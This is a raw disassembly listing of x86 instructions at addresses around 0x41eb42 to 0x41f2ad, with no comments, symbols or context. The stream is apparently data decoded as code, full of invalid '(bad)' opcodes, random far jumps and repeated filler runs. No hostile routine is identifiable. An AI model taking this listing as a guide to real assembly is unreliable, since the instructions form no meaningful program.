  41eb42:	xor    al,0x60
  41eb44:	cmp    eax,0x83aaec92
  41eb49:	inc    esi
  41eb4a:	dec    eax
  41eb4b:	mov    al,0x9f
  41eb4d:	xchg   ecx,eax
  41eb4e:	cli    
  41eb4f:	mov    cs,esp
  41eb51:	push   ecx
  41eb52:	ret    0xd7a8
  41eb55:	xchg   ecx,eax
  41eb56:	cmp    bl,BYTE PTR [eax+0xfbafea3]
  41eb5c:	dec    edi
  41eb5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb5e:	iret   
	...
  41eb6b:	xchg   esp,eax
  41eb6c:	nop
  41eb6d:	ffree  st(0)
  41eb6f:	(bad)  
  41eb71:	popf   
  41eb72:	aam    0x57
  41eb74:	(bad)
  41eb78:	cdq    
  41eb79:	xchg   edi,eax
  41eb7a:	fldcw  WORD PTR [ebx-0x72]
  41eb7d:	add    DWORD PTR [eax],eax
  41eb7f:	lods   al,BYTE PTR ds:[esi]
  41eb80:	add    BYTE PTR [eax],al
  41eb82:	add    BYTE PTR ds:0xc3994fde,ch
  41eb88:	mov    fs,WORD PTR [edx]
  41eb8a:	jp     0x41ebde
  41eb8c:	mov    DWORD PTR [ebp-0x100b332a],esp
  41eb92:	daa    
  41eb93:	sub    DWORD PTR [esi],ebx
  41eb95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb96:	mov    ch,0x6f
  41eb98:	scas   al,BYTE PTR es:[edi]
  41eb99:	mov    al,ds:0x8d88543a
  41eb9e:	test   BYTE PTR [ebx+eax*2-0x31e416],dh
  41eba5:	pop    es
  41eba6:	mov    al,ds:0xa03c9b9c
  41ebab:	xor    ah,BYTE PTR [esi]
  41ebad:	(bad)  
  41ebae:	(bad)  [esi-0x7d]
  41ebb1:	xor    al,0x8d
  41ebb3:	loope  0x41ebb8
  41ebb5:	adc    eax,0x83ce05a3
  41ebba:	das    
  41ebbb:	addr16 hlt 
  41ebbd:	inc    edi
  41ebbe:	dec    esi
  41ebbf:	push   esp
  41ebc0:	jp     0x41eb72
  41ebc2:	fwait
  41ebc3:	retf   0x5fa5
  41ebc6:	and    eax,0xa1541046
  41ebcb:	sbb    ah,BYTE PTR [ebx]
  41ebcd:	out    0xb3,eax
  41ebcf:	leave  
  41ebd0:	jmp    0x7e1c:0xb5dd88e1
  41ebd7:	ins    BYTE PTR es:[di],dx
  41ebd9:	data16 int 0x8a
  41ebdc:	inc    edi
  41ebdd:	loop   0x41eba0
  41ebdf:	xchg   BYTE PTR [edx+0x26eea870],cl
  41ebe5:	fsubr  st,st(2)
  41ebe7:	inc    edi
  41ebe8:	cmp    ebp,DWORD PTR ds:0xadd0c875
  41ebee:	sub    BYTE PTR [esi-0x7e],dl
  41ebf1:	loopne 0x41ec68
  41ebf3:	fsub   st(4),st
  41ebf5:	fst    QWORD PTR [ebx+0x40]
  41ebf8:	or     BYTE PTR [ecx],dh
  41ebfa:	in     eax,dx
  41ebfb:	inc    edi
  41ebfc:	xor    BYTE PTR [edi+0x5df5cb63],ch
  41ec02:	mov    esi,0x76f21c49
  41ec07:	ret    
  41ec08:	(bad)  
  41ec09:	push   ebx
  41ec0a:	test   DWORD PTR [ecx+0x2f0183c4],esi
  41ec10:	ins    DWORD PTR es:[edi],dx
  41ec11:	sbb    al,0x2f
  41ec13:	xor    al,BYTE PTR [esi+0x615d6f38]
  41ec19:	xlat   BYTE PTR ds:[ebx]
  41ec1a:	or     al,ah
  41ec1c:	mov    esp,0xff3c5849
  41ec21:	jmp    0x8cb3:0xbee1cc73
  41ec28:	inc    esp
  41ec29:	test   DWORD PTR [esi+0x36],ebp
  41ec2c:	mov    dl,0xf3
  41ec2e:	jecxz  0x41ec30
	...
  41ec38:	add    BYTE PTR [eax],al
  41ec3a:	add    ah,dh
  41ec3c:	mov    dl,0x32
  41ec3e:	(bad)  
  41ec3f:	jbe    0x41ec17
  41ec41:	hlt    
  41ec42:	mov    dl,0xb1
  41ec44:	and    al,0xfe
  41ec46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec47:	lods   eax,DWORD PTR ds:[esi]
  41ec48:	mov    eax,0x8f1722f4
  41ec4d:	add    DWORD PTR [eax],eax
  41ec4f:	lods   al,BYTE PTR ds:[esi]
  41ec50:	add    BYTE PTR [eax],al
  41ec52:	add    bh,ah
  41ec54:	(bad)  
  41ec55:	sub    edx,ebp
  41ec57:	pop    eax
  41ec58:	stos   BYTE PTR es:[edi],al
  41ec59:	jle    0x41ec49
  41ec5b:	in     eax,dx
  41ec5c:	cmp    eax,0xbd4afaaa
  41ec61:	aas    
  41ec62:	cmc    
  41ec63:	inc    esi
  41ec64:	call   0xb1063a02
  41ec69:	sub    BYTE PTR ds:0xc7d0285b,bh
  41ec6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec70:	jmp    0x5457c560
  41ec75:	arpl   WORD PTR [ebp-0x1361f46c],bp
  41ec7b:	mov    fs,ecx
  41ec7d:	shr    DWORD PTR [ebx-0x6b],cl
  41ec80:	sub    edi,DWORD PTR [edx+edi*4+0x72]
  41ec84:	imul   ebp,esi,0xa58c499e
  41ec8a:	xor    ebp,DWORD PTR [esi+0x27a9a20a]
  41ec90:	xlat   BYTE PTR ds:[ebx]
  41ec91:	pop    edi
  41ec92:	push   ds
  41ec93:	mov    edx,DWORD PTR [ecx+esi*1+0x37]
  41ec97:	stos   DWORD PTR es:[edi],eax
  41ec98:	scas   eax,DWORD PTR es:[edi]
  41ec99:	mov    eax,ds:0x5dab08d
  41ec9e:	faddp  st(1),st
  41eca0:	out    dx,al
  41eca1:	push   ebp
  41eca2:	das    
  41eca3:	dec    edi
  41eca4:	imul   ecx,DWORD PTR [edx],0x59
  41eca7:	mov    eax,0x50b6f2d3
  41ecac:	mov    eax,ds:0xcb6f5088
  41ecb1:	pop    esi
  41ecb2:	popa   
  41ecb3:	fmul   QWORD PTR [ebx+0x12745362]
  41ecb9:	fstp   QWORD PTR [edi+eax*2-0x7bcba3cc]
  41ecc0:	pop    ss
  41ecc1:	push   esi
  41ecc2:	sub    eax,0x26ffa19c
  41ecc7:	jecxz  0x41ecf8
  41ecc9:	xor    DWORD PTR [ebx-0x2a],esi
  41eccc:	jnp    0x41ecdf
  41ecce:	jae    0x41ec58
  41ecd0:	sti    
  41ecd1:	pop    esi
  41ecd2:	fwait
  41ecd3:	mov    WORD PTR [ebp-0x76],gs
  41ecd6:	sti    
  41ecd7:	pop    eax
  41ecd8:	xchg   edx,eax
  41ecd9:	xchg   edi,eax
  41ecda:	cli    
  41ecdb:	push   esi
  41ecdc:	aaa    
  41ecdd:	fnstcw WORD PTR [edi+esi*4]
  41ece0:	pusha  
  41ece1:	mov    cl,0x72
  41ece3:	push   ecx
  41ece4:	xor    BYTE PTR [esi+0x324a57ae],bl
  41ecea:	cmp    dh,BYTE PTR [edx-0x2dcf3d51]
  41ecf0:	xchg   edi,eax
  41ecf1:	test   eax,0x88d0c7b6
  41ecf6:	push   cs
  41ecf7:	in     eax,dx
  41ecf8:	popa   
  41ecf9:	retf   
  41ecfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecfb:	adc    bl,cl
  41ecfd:	and    BYTE PTR [ebx],al
	...
  41ed0b:	xor    dl,bl
  41ed0d:	into   
  41ed0e:	mov    ds:0xd37ebfef,al
  41ed13:	sub    edi,DWORD PTR [esi]
  41ed15:	out    0x3f,eax
  41ed17:	mov    al,ds:0xc3321818
  41ed1c:	pop    DWORD PTR [ecx]
  41ed1e:	add    BYTE PTR [eax+eax*1+0x28600000],ch
  41ed25:	lock jp 0x41ecb6
  41ed28:	xchg   esi,eax
  41ed29:	popa   
  41ed2a:	mov    cs,WORD PTR [esi-0x2a04a99f]
  41ed30:	imul   eax,DWORD PTR [eax-0x3ea4e7a6],0xe87a06b2
  41ed3a:	fbld   TBYTE PTR [ecx-0x62e67dc9]
  41ed40:	push   cs
  41ed41:	xor    DWORD PTR [edi-0x2ad5902],eax
  41ed47:	dec    eax
  41ed48:	xor    ah,dl
  41ed4a:	jmp    0x29c76ef8
  41ed4f:	(bad)  
  41ed50:	std    
  41ed51:	or     DWORD PTR [edi],esp
  41ed53:	push   0xffffff96
  41ed55:	sbb    bh,BYTE PTR [edi]
  41ed57:	gs int 0x9
  41ed5a:	cs sar ah,1
  41ed5d:	les    eax,FWORD PTR [edx-0x352fef61]
  41ed63:	push   esi
  41ed64:	stos   BYTE PTR es:[edi],al
  41ed65:	jl     0x41ed10
  41ed67:	xor    DWORD PTR [esi-0x27],edx
  41ed6a:	xor    al,0xc
  41ed6c:	es mov cl,0xe0
  41ed6f:	fs in  al,dx
  41ed71:	fisttp DWORD PTR [esi+0x4]
  41ed74:	jecxz  0x41ed77
  41ed76:	int    0x5a
  41ed78:	sbb    DWORD PTR [ecx-0x582248d4],edi
  41ed7e:	loope  0x41ed6b
  41ed80:	adc    al,0x71
  41ed82:	xor    edi,DWORD PTR [edx+0x69]
  41ed85:	loopne 0x41edc2
  41ed87:	mov    al,ds:0x37329550
  41ed8c:	loopne 0x41ed21
  41ed8e:	jnp    0x41ed22
  41ed90:	push   0x703e9a6f
  41ed95:	or     ch,BYTE PTR [esi+0x8]
  41ed98:	out    0x27,al
  41ed9a:	mov    esi,0x3326d3a4
  41ed9f:	mov    BYTE PTR [eax-0x19],dh
  41eda2:	or     BYTE PTR ds:0x182307af,dh
  41eda8:	fcomp  DWORD PTR [ebx+eax*8]
  41edab:	fidiv  WORD PTR [eax-0x38ce74d2]
  41edb1:	ja     0x41edda
  41edb3:	xor    ch,ch
  41edb5:	mov    ah,0xd2
  41edb7:	lock jnp 0x41eddb
  41edba:	shl    DWORD PTR [ebx+0x28],0xbe
  41edbe:	mov    ebx,ecx
  41edc0:	in     al,dx
  41edc1:	and    DWORD PTR [edi-0x55],edx
  41edc4:	sbb    ecx,esi
  41edc6:	push   cs
  41edc7:	lods   eax,DWORD PTR ds:[esi]
  41edc8:	jnp    0x41ee42
  41edca:	jns    0x41ed52
  41edcc:	pop    esi
  41edcd:	test   ecx,esi
	...
  41eddb:	fucomi st,st(5)
  41eddd:	outs   dx,BYTE PTR ds:[esi]
  41edde:	and    bh,BYTE PTR [esi-0x5d]
  41ede1:	(bad)  
  41ede3:	pop    esi
  41ede4:	(bad)  
  41ede5:	mov    DWORD PTR [ebp-0x1d3d99d8],ecx
  41edeb:	outs   dx,DWORD PTR ds:[esi]
  41edec:	nop
  41eded:	add    DWORD PTR [eax],eax
  41edef:	lods   al,BYTE PTR ds:[esi]
  41edf0:	add    BYTE PTR [eax],al
  41edf2:	add    BYTE PTR [esi-0x22009e41],bh
  41edf8:	cmc    
  41edf9:	xchg   ebp,eax
  41edfa:	int    0xce
  41edfc:	or     bl,0xec
  41edff:	repnz stos DWORD PTR es:[edi],eax
  41ee01:	xchg   esp,eax
  41ee02:	dec    ebp
  41ee03:	lahf   
  41ee04:	sbb    BYTE PTR [eax],bh
  41ee06:	add    BYTE PTR [ecx-0x6f],ch
  41ee09:	and    al,0xc7
  41ee0b:	add    ecx,DWORD PTR [eax-0x4b204510]
  41ee11:	xchg   ecx,eax
  41ee12:	mov    eax,ds:0x4654bbc2
  41ee17:	aad    0x8a
  41ee19:	xchg   esp,eax
  41ee1a:	mov    al,ds:0x140d8353
  41ee1f:	inc    esp
  41ee20:	out    dx,al
  41ee21:	out    dx,al
  41ee22:	cmp    DWORD PTR [edx+edx*1-0x15c19013],0xd073216a
  41ee2d:	fwait
  41ee2e:	inc    ecx
  41ee2f:	jmp    0xf3abc601
  41ee34:	jmp    0xdaaef4d3
  41ee39:	int    0x53
  41ee3b:	arpl   WORD PTR [edi+0x17],cx
  41ee3e:	fcmovnu st,st(2)
  41ee40:	jb     0x41edff
  41ee42:	dec    ebp
  41ee43:	pop    ebp
  41ee44:	stc    
  41ee45:	repz sbb BYTE PTR [ebx],al
  41ee48:	push   ss
  41ee49:	(bad)  
  41ee4a:	ds dec edi
  41ee4c:	inc    esi
  41ee4d:	mov    ds:0xb99536d3,ax
  41ee53:	inc    ebp
  41ee54:	fild   DWORD PTR [ebp-0x3567b168]
  41ee5a:	ja     0x41edfa
  41ee5c:	nop
  41ee5d:	leave  
  41ee5e:	sub    al,0xae
  41ee60:	cdq    
  41ee61:	lods   eax,DWORD PTR ds:[esi]
  41ee62:	imul   eax,DWORD PTR [eax+0x45],0x51
  41ee66:	mov    eax,ds:0x1aa2ba7a
  41ee6b:	mov    cl,0xb6
  41ee6d:	popa   
  41ee6e:	ins    BYTE PTR es:[edi],dx
  41ee6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee70:	std    
  41ee71:	popf   
  41ee72:	dec    BYTE PTR [edx+eiz*2-0x44]
  41ee76:	imul   ecx,DWORD PTR [ebx-0xcdd65f2],0xc0f6e634
  41ee80:	mov    eax,ds:0xe7a237de
  41ee85:	xchg   ebp,eax
  41ee86:	sub    BYTE PTR [ebx+0x6349e89d],al
  41ee8c:	and    BYTE PTR [ebx],bh
  41ee8e:	mov    DWORD PTR [edi],0xcefdcd3c
  41ee94:	pop    ebx
  41ee95:	in     eax,0x9c
  41ee97:	jne    0x41eedb
  41ee99:	scas   eax,DWORD PTR es:[edi]
  41ee9a:	jp     0x41eef7
  41ee9c:	xchg   esp,eax
  41ee9d:	popf   
  41ee9e:	icebp  
	...
  41eeab:	add    eax,0x6f976b22
  41eeb0:	(bad)  
  41eeb2:	mov    dl,0x66
  41eeb4:	and    BYTE PTR [esi-0x5d953696],ah
  41eeba:	add    BYTE PTR [ebx],bl
  41eebc:	xchg   ecx,eax
  41eebd:	add    DWORD PTR [eax],eax
  41eebf:	lods   al,BYTE PTR ds:[esi]
  41eec0:	add    BYTE PTR [eax],al
  41eec2:	add    BYTE PTR [edi+ecx*8+0x6f],dh
  41eec6:	add    BYTE PTR [esi],cl
  41eec8:	mov    bx,0x8d79
  41eecc:	sbb    dh,BYTE PTR [edi+0x3]
  41eecf:	and    al,0xa8
  41eed1:	shr    BYTE PTR [esi],1
  41eed3:	loope  0x41ee89
  41eed5:	xchg   bl,ch
  41eed7:	popf   
  41eed8:	int    0xe4
  41eeda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eedb:	mov    esi,cs
  41eedd:	iret   
  41eede:	add    bh,ah
  41eee0:	iret   
  41eee1:	xor    DWORD PTR [ecx-0x17],esp
  41eee4:	sub    BYTE PTR [ebp+0x29],bl
  41eee7:	ret    
  41eee8:	in     al,0xe3
  41eeea:	stc    
  41eeeb:	ja     0x41ee86
  41eeed:	fcos   
  41eeef:	fisttp WORD PTR [ebp-0xefed4e8]
  41eef5:	cmp    BYTE PTR [eax],ch
  41eef7:	mov    eax,ds:0x9525c2db
  41eefc:	pop    ss
  41eefd:	out    dx,al
  41eefe:	mov    edi,0x9e781089
  41ef03:	mov    WORD PTR ss:[eax-0x64d3e04f],es
  41ef0a:	(bad)  
  41ef0b:	fist   DWORD PTR [edx+0x46f79d9]
  41ef11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef12:	pushf  
  41ef13:	jbe    0x41eef6
  41ef15:	jp     0x41eef0
  41ef17:	das    
  41ef18:	lods   al,BYTE PTR ds:[esi]
  41ef19:	adc    DWORD PTR [edx+0x4ff3f4f5],edx
  41ef1f:	adc    BYTE PTR [edi-0x5984d7e5],0x6
  41ef26:	cmp    eax,0x51e9841e
  41ef2b:	scas   al,BYTE PTR es:[edi]
  41ef2c:	dec    edx
  41ef2d:	outs   dx,DWORD PTR ds:[esi]
  41ef2e:	inc    eax
  41ef2f:	inc    edi
  41ef30:	int3   
  41ef31:	add    edx,DWORD PTR [edx]
  41ef33:	or     esi,ebx
  41ef35:	mov    cl,0x35
  41ef37:	push   esi
  41ef38:	and    BYTE PTR [eax-0x6918d2ca],dh
  41ef3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef3f:	lea    edx,[eax+0x21]
  41ef42:	mov    edx,0x7e99d3e7
  41ef47:	and    esi,esi
  41ef49:	ds inc di
  41ef4c:	int3   
  41ef4d:	adc    DWORD PTR [eax],esi
  41ef4f:	cld    
  41ef50:	retf   0xaaad
  41ef53:	xor    ebx,DWORD PTR [edi+0x41]
  41ef56:	jge    0x41eef1
  41ef58:	addr16 mov edi,ss
  41ef5b:	fcmovnu st,st(6)
  41ef5d:	mov    edi,0xbbfc7f3e
  41ef62:	and    eax,esp
  41ef64:	stos   DWORD PTR es:[edi],eax
  41ef65:	sbb    dh,BYTE PTR [ebx-0xa]
  41ef68:	ss aaa 
  41ef6a:	jb     0x41ef70
  41ef6c:	mov    eax,ds:0x54ab
	...
  41ef79:	add    BYTE PTR [eax],al
  41ef7b:	mov    edx,esp
  41ef7d:	and    al,0xd9
  41ef7f:	jg     0x41ef7a
  41ef81:	call   esi
  41ef83:	into   
  41ef84:	inc    ebp
  41ef85:	mov    bh,0x11
  41ef87:	sahf   
  41ef88:	sub    DWORD PTR [ecx+0x65],ebp
  41ef8b:	(bad)  
  41ef8c:	xchg   ecx,eax
  41ef8d:	add    DWORD PTR [eax],eax
  41ef8f:	lods   al,BYTE PTR ds:[esi]
  41ef90:	add    BYTE PTR [eax],al
  41ef92:	add    BYTE PTR [ecx],ch
  41ef94:	sahf   
  41ef95:	je     0x41ef8f
  41ef97:	lods   eax,DWORD PTR ds:[esi]
  41ef98:	lahf   
  41ef99:	outs   dx,DWORD PTR ds:[esi]
  41ef9a:	ds pop es
  41ef9c:	or     dl,BYTE PTR [edx+0x3e]
  41ef9f:	lahf   
  41efa0:	rcr    DWORD PTR [ebx+ebp*4],0x85
  41efa4:	jbe    0x41efaa
  41efa6:	adc    bl,BYTE PTR [edx+0x18]
  41efa9:	out    dx,al
  41efaa:	xchg   edx,eax
  41efab:	or     eax,0x8804a7b3
  41efb0:	add    al,0x4b
  41efb2:	jl     0x41f009
  41efb4:	add    bl,BYTE PTR [edi+0x2c84402f]
  41efba:	adc    al,0x36
  41efbc:	sbb    eax,0x8c5d9ea5
  41efc1:	hlt    
  41efc2:	push   es
  41efc3:	test   BYTE PTR [ebx],cl
  41efc5:	jb     0x41efe5
  41efc7:	rcl    DWORD PTR [esi],1
  41efc9:	out    0x43,eax
  41efcb:	sub    ebp,eax
  41efcd:	stos   DWORD PTR es:[edi],eax
  41efce:	add    al,0x13
  41efd0:	jecxz  0x41f030
  41efd2:	adc    al,0x30
  41efd4:	mov    ds:0xbbff2e08,al
  41efd9:	and    al,BYTE PTR [ebp+0x49dfd2cf]
  41efdf:	nop
  41efe0:	push   ebx
  41efe1:	mov    bh,0xc9
  41efe3:	push   eax
  41efe4:	fs sbb eax,0x850a633e
  41efea:	add    al,0x67
  41efec:	lea    eax,[esi-0x6a]
  41efef:	mov    bh,0x55
  41eff1:	(bad)  [ebp+0x3d]
  41eff4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eff5:	ss mov ebp,0xf1ac0a2b
  41effb:	sbb    al,0x1e
  41effd:	call   edx
  41efff:	adc    eax,0xe19f2dab
  41f004:	adc    al,0x9b
  41f006:	sar    BYTE PTR ds:[edi],cl
  41f009:	sbb    al,0x8c
  41f00b:	and    al,0x34
  41f00d:	scas   eax,DWORD PTR es:[edi]
  41f00e:	stos   DWORD PTR es:[edi],eax
  41f00f:	and    bl,BYTE PTR [ecx+0x69053c11]
  41f015:	jo     0x41f059
  41f017:	jne    0x41f000
  41f019:	jae    0x41f00a
  41f01b:	cmp    cl,BYTE PTR [edx]
  41f01d:	mov    edx,DWORD PTR [ebp-0x27]
  41f020:	nop
  41f021:	xor    esi,DWORD PTR [ecx+0x32]
  41f024:	add    ch,al
  41f026:	xchg   edi,eax
  41f027:	xlat   BYTE PTR ds:[ebx]
  41f028:	xchg   edi,eax
  41f029:	bound  esp,QWORD PTR [ebx-0x231680fc]
  41f02f:	lods   al,BYTE PTR ds:[esi]
  41f030:	popf   
  41f031:	fs lahf 
  41f033:	xchg   edx,eax
  41f034:	pop    edx
  41f035:	popf   
  41f036:	jns    0x41f025
  41f038:	dec    ebp
  41f039:	shl    ebx,cl
  41f03b:	add    ebx,edx
  41f03d:	ins    BYTE PTR es:[edi],dx
  41f03e:	xchg   esi,eax
	...
  41f04b:	fisubr WORD PTR [ecx]
  41f04d:	cwde   
  41f04e:	sar    bh,cl
  41f050:	repz fisubr WORD PTR ds:0x4af35f6
  41f057:	(bad)  
  41f058:	cmp    DWORD PTR [edi+0x19273aa],eax
  41f05e:	add    BYTE PTR [eax+eax*1+0x6d700000],ch
  41f065:	loop   0x41f09f
  41f067:	cmp    eax,0x8c9f4a37
  41f06c:	mov    eax,0x6dce8557
  41f071:	mov    eax,0x436017e8
  41f076:	or     eax,0x32fa72d7
  41f07b:	cs pop ds
  41f07d:	mov    esp,0x4a853b0b
  41f082:	mov    edi,0x9ad325e9
  41f087:	cwde   
  41f088:	adc    BYTE PTR ds:0x62f1273a,0x7
  41f08f:	mov    bh,0x44
  41f091:	sub    al,BYTE PTR [esi+0x45]
  41f094:	sub    eax,0x495d6657
  41f099:	push   eax
  41f09a:	jb     0x41f047
  41f09c:	mov    edi,DWORD PTR [ebx+0x23]
  41f09f:	inc    eax
  41f0a0:	add    eax,0xf6189389
  41f0a5:	imul   esp,DWORD PTR [edi-0x63],0xe0f6e78a
  41f0ac:	loope  0x41f0de
  41f0ae:	push   0x7a
  41f0b0:	mov    dh,0x1b
  41f0b2:	shl    WORD PTR [ebx-0x13],0x44
  41f0b7:	and    al,0x39
  41f0b9:	retf   0xb739
  41f0bc:	xor    ebp,ecx
  41f0be:	dec    esp
  41f0bf:	mov    al,0x82
  41f0c1:	sub    BYTE PTR [ebp-0x1d755792],0x7d
  41f0c8:	test   eax,0x8d0784c8
  41f0cd:	add    bl,BYTE PTR [ecx-0x17]
  41f0d0:	push   ebx
  41f0d1:	xchg   BYTE PTR [eax],al
  41f0d3:	retf   0xbb65
  41f0d6:	clc    
  41f0d7:	push   ebx
  41f0d8:	stos   BYTE PTR es:[edi],al
  41f0d9:	jg     0x41f085
  41f0db:	cmp    BYTE PTR [esi+0x3cee806b],dh
  41f0e1:	sub    edi,edx
  41f0e3:	(bad)  
  41f0e4:	push   ebp
  41f0e5:	cli    
  41f0e6:	lods   eax,DWORD PTR ds:[esi]
  41f0e7:	das    
  41f0e8:	mov    edi,0x543cd9ee
  41f0ed:	add    eax,0x1c92ef6a
  41f0f2:	iret   
  41f0f3:	addr16 inc ecx
  41f0f5:	test   DWORD PTR [ecx],ebp
  41f0f7:	in     al,0x18
  41f0f9:	mov    dl,BYTE PTR [esi-0x9]
  41f0fc:	cmp    al,0x9
  41f0fe:	clc    
  41f0ff:	xor    ebp,DWORD PTR ds:0x131be8de
  41f105:	ss dec edx
  41f107:	inc    esi
  41f108:	mov    esi,0xd1868b53
  41f10d:	or     al,BYTE PTR cs:[eax]
	...
  41f118:	add    BYTE PTR [eax],al
  41f11a:	add    BYTE PTR [esi+0x3f],cl
  41f11d:	int3   
  41f11e:	sbb    eax,0x7fdffffd
  41f123:	out    dx,eax
  41f124:	loopne 0x41f13c
  41f126:	lods   al,BYTE PTR ds:[esi]
  41f127:	mov    ecx,0x1fc0d03f
  41f12c:	xchg   ebx,eax
  41f12d:	add    DWORD PTR [eax],eax
  41f12f:	lods   al,BYTE PTR ds:[esi]
  41f130:	add    BYTE PTR [eax],al
  41f132:	add    BYTE PTR [edx+0x4c],bl
  41f135:	push   ecx
  41f136:	dec    esi
  41f137:	mov    esi,0xcb5ccc7f
  41f13c:	imul   ebp
  41f13e:	int3   
  41f13f:	pop    ecx
  41f140:	fs test eax,0xb51b3cfa
  41f146:	leave  
  41f147:	or     bl,dl
  41f149:	inc    ecx
  41f14a:	or     edi,0xffffffd7
  41f14d:	sti    
  41f14e:	inc    ebp
  41f14f:	mov    WORD PTR [edi-0x4846f2b],es
  41f155:	call   0x8f22:0xa4413d95
  41f15c:	cli    
  41f15d:	mov    esi,DWORD PTR [ebp-0x48]
  41f160:	in     al,0xa6
  41f162:	into   
  41f163:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f164:	les    edi,FWORD PTR ds:[ebx]
  41f167:	lods   eax,DWORD PTR ds:[esi]
  41f168:	push   esp
  41f169:	xor    eax,0x716ab4fa
  41f16e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f16f:	mov    dh,0x69
  41f171:	dec    eax
  41f172:	int3   
  41f173:	inc    edx
  41f174:	test   al,ah
  41f176:	push   ss
  41f177:	ror    ebx,0x7d
  41f17a:	sub    BYTE PTR [eax-0x2bf8160],0x24
  41f181:	mov    al,0x15
  41f183:	ret    
  41f184:	lock int 0xc4
  41f187:	outs   dx,BYTE PTR ds:[esi]
  41f188:	lods   al,BYTE PTR ds:[esi]
  41f189:	dec    ebx
  41f18a:	lods   al,BYTE PTR fs:[esi]
  41f18c:	test   BYTE PTR [ebx+0x6f69d408],bl
  41f192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f193:	add    BYTE PTR [ecx-0x46],al
  41f196:	outs   dx,DWORD PTR ds:[esi]
  41f197:	or     ecx,eax
  41f199:	add    al,0x5a
  41f19b:	inc    ebp
  41f19c:	inc    esi
  41f19d:	or     DWORD PTR [esi-0x22b569c8],ecx
  41f1a3:	mov    cl,0x1a
  41f1a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1a6:	stos   BYTE PTR es:[edi],al
  41f1a7:	and    eax,0xca5bad64
  41f1ac:	pop    ecx
  41f1ad:	es repz pusha 
  41f1b0:	bound  esp,QWORD PTR [ebp+esi*8+0x752d707d]
  41f1b7:	cmc    
  41f1b8:	jbe    0x41f19f
  41f1ba:	add    eax,0xf55aa57c
  41f1bf:	mov    ds:0xa2894ac9,al
  41f1c4:	icebp  
  41f1c5:	psrad  mm6,QWORD PTR [eax-0x5f]
  41f1c9:	dec    ebp
  41f1ca:	loop   0x41f1f3
  41f1cc:	jge    0x41f1e1
  41f1ce:	(bad)  
  41f1cf:	rcl    DWORD PTR [edx-0x74],cl
  41f1d2:	(bad)  
  41f1d4:	retf   
  41f1d5:	mov    cl,0xd5
  41f1d7:	jle    0x41f160
  41f1d9:	(bad)  
  41f1da:	js     0x41f1e8
  41f1dc:	sbb    DWORD PTR [ecx+0x4a],ebp
	...
  41f1ea:	add    BYTE PTR [esi],bl
  41f1ec:	test   eax,0x7ff735f6
  41f1f1:	fild   QWORD PTR [ebx-0x5f9ed871]
  41f1f7:	jge    0x41f26e
  41f1f9:	pop    ebp
  41f1fa:	(bad)  
  41f1fb:	retf   
  41f1fc:	xchg   ebx,eax
  41f1fd:	add    DWORD PTR [eax],eax
  41f1ff:	lods   al,BYTE PTR ds:[esi]
  41f200:	add    BYTE PTR [eax],al
  41f202:	add    ch,ch
  41f204:	mov    esp,0x2fe259b2
  41f209:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f20a:	call   0x44c955e9
  41f20f:	dec    ebx
  41f210:	shl    bl,0xa5
  41f213:	xchg   edi,eax
  41f214:	mov    ebp,DWORD PTR ds:0xb18bf98f
  41f21a:	push   esi
  41f21b:	jecxz  0x41f288
  41f21d:	jmp    0x4acf:0x75fdd052
  41f224:	jae    0x41f1a6
  41f226:	inc    ebx
  41f227:	scas   eax,DWORD PTR es:[edi]
  41f228:	les    eax,FWORD PTR [ecx-0x59]
  41f22b:	xchg   edx,eax
  41f22c:	sub    ebx,DWORD PTR [esi+0xf]
  41f22f:	int    0x44
  41f231:	xchg   esi,eax
  41f232:	mov    cs,WORD PTR [ebx+0x36c111e0]
  41f238:	dec    ecx
  41f239:	hlt    
  41f23a:	xchg   edi,eax
  41f23b:	inc    eax
  41f23c:	loop   0x41f1be
  41f23e:	out    dx,al
  41f23f:	xor    dh,BYTE PTR ds:0x12c8c621
  41f245:	fdiv   DWORD PTR [ebx+0x1b]
  41f248:	out    dx,al
  41f249:	xchg   esp,eax
  41f24a:	xor    BYTE PTR ds:0x28053a24,bl
  41f250:	pop    edi
  41f251:	(bad)  
  41f252:	xchg   esi,eax
  41f253:	sub    eax,DWORD PTR es:[ecx]
  41f256:	mov    edi,0x3191cad3
  41f25b:	xor    al,BYTE PTR [ebp+0x3e]
  41f25e:	es dec edx
  41f260:	ins    DWORD PTR es:[edi],dx
  41f261:	xchg   ecx,eax
  41f262:	mov    dl,0xa5
  41f264:	push   es
  41f265:	mov    esi,0xc52b1390
  41f26a:	cmp    ebx,DWORD PTR [ebp-0x77]
  41f26d:	jg     0x41f2bd
  41f26f:	jecxz  0x41f2b0
  41f271:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f272:	sbb    ecx,DWORD PTR [edx]
  41f274:	lahf   
  41f275:	pusha  
  41f276:	inc    esp
  41f277:	jae    0x41f2b5
  41f279:	cmp    edx,DWORD PTR [ebp-0x66142f7a]
  41f27f:	push   ds
  41f280:	jnp    0x41f29a
  41f282:	(bad)  
  41f283:	jne    0x41f2e7
  41f285:	sbb    esi,DWORD PTR [ecx+0x1d553986]
  41f28b:	inc    ebx
  41f28c:	sub    ch,dh
  41f28e:	call   0xcf59:0xbcd325c3
  41f295:	inc    edi
  41f296:	jnp    0x41f2d5
  41f298:	mov    edi,0x67b2b5f4
  41f29d:	xor    edi,ebp
  41f29f:	in     al,dx
  41f2a0:	inc    ebp
  41f2a1:	aam    0x19
  41f2a3:	inc    esi
  41f2a4:	into   
  41f2a5:	loopne 0x41f249
  41f2a7:	cmp    DWORD PTR [esi-0x75],ecx
  41f2aa:	addr16 aad 0xf8
  41f2ad:	imul   ebx,DWORD PTR [eax+eax*1+0x0],0x0
	...
